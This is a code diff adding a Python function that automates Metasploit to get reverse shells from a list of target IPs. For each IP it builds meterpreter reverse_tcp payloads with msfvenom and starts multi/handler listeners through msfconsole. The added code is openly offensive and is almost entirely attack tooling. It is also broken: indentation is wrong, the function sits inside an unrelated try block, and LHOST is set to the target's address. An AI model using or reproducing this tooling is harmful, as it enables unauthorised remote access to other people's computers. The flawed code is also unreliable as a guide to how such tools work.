@@ -441,6 +441,60 @@ def find_router_via_ifconfig():
                     print(f"Default router found: {router_ip}")
                     return router_ip
         print("No default router found.")
+
+    def get_shells_of_target_ips(target_ips, lport=4444, payload_type="windows/meterpreter/reverse_tcp"):
+        """
+        Attempts to get reverse shells from the given target IPs by generating payloads and starting handlers.
+        This function assumes you have Metasploit installed and accessible as 'msfconsole' and 'msfvenom'.
+
+        :param target_ips: List of target IP addresses.
+        :param lport: Local port to listen for reverse shells.
+        :param payload_type: Payload type for msfvenom and Metasploit handler.
+        """
+
+        for ip in target_ips:
+        output_file = f"payload_{ip.replace('.', '_')}.bin"
+        # Generate payload
+        try:
+            subprocess.run([
+            "msfvenom",
+            "-p", payload_type,
+            f"LHOST={ip}",
+            f"LPORT={lport}",
+            "-f", "raw",
+            "-o", output_file
+            ], check=True)
+            print(f"Payload generated for {ip}: {output_file}")
+        except Exception as e:
+            print(f"Failed to generate payload for {ip}: {e}")
+            continue
+
+        # Start Metasploit handler
+        msf_commands = f"""
+    use exploit/multi/handler
+    set PAYLOAD {payload_type}
+    set LHOST {ip}
+    set LPORT {lport}
+    set ExitOnSession false
+    exploit -j
+    """
+        try:
+            process = subprocess.Popen(
+            ["msfconsole", "-q"],
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+            )
+            process.stdin.write(msf_commands)
+            process.stdin.write("exit\n")
+            process.stdin.flush()
+            stdout, stderr = process.communicate()
+            print(stdout)
+            if stderr:
+            print(f"Errors for {ip}:\n{stderr}")
+        except Exception as e:
+            print(f"Failed to start handler for {ip}: {e}")
     except Exception as e:
         print(f"Failed to identify router: {e}")
 
